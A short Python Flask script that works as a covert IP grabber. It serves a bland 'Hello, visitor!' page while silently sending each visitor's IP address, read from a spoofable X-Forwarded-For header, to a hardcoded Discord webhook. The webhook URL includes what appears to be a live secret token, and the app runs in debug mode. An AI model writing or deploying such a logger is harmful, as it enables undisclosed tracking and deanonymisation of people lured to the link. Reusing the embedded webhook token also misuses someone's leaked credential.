from flask import Flask, request
import requests

app = Flask(__name__)

@app.route('/')
def index():
  ip_address = get_client_ip(request)
  send_to_discord(ip_address)
  return '<h1>Hello, visitor!</h1>'

def get_client_ip(request):
    # Try to get the client IP from the X-Forwarded-For header
    x_forwarded_for = request.headers.getlist('X-Forwarded-For')
    if x_forwarded_for:
        # Use the first IP address in the list
        ip_address = x_forwarded_for[0]
    else:
        # Otherwise, use the remote address
        ip_address = request.remote_addr
    return ip_address

def send_to_discord(ip_address):
  webhook_url = "https://discord.com/api/webhooks/1257278872106307586/98V-jdvIWaEFIv1uBqC3e60aokEtZn0qNT3_PLctqPZLFThogKfu7pHQ1Kd6MlhkFT8W"  # Replace with your actual webhook
  message = f"New visitor: {ip_address}"
  data = {'content': message}
  requests.post(webhook_url, json=data)

if __name__ == '__main__':
  app.run(debug=True)
